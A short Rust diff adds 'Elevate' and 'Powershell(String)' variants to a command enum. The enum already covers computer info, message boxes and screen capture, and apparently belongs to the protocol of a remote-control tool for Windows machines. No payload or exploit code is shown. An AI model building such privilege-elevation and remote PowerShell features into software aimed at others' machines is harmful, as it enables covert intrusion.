@@ -41,6 +41,8 @@ pub enum CapturePacket {
 #[derive(Encode, Decode, Clone)]
 pub enum Command {
     ComputerInfo,
+    Elevate,
+    Powershell(String), // string is the command
     MessageBox(MessageBoxArgs),
     Capture(CaptureCommand, CaptureType),
 }
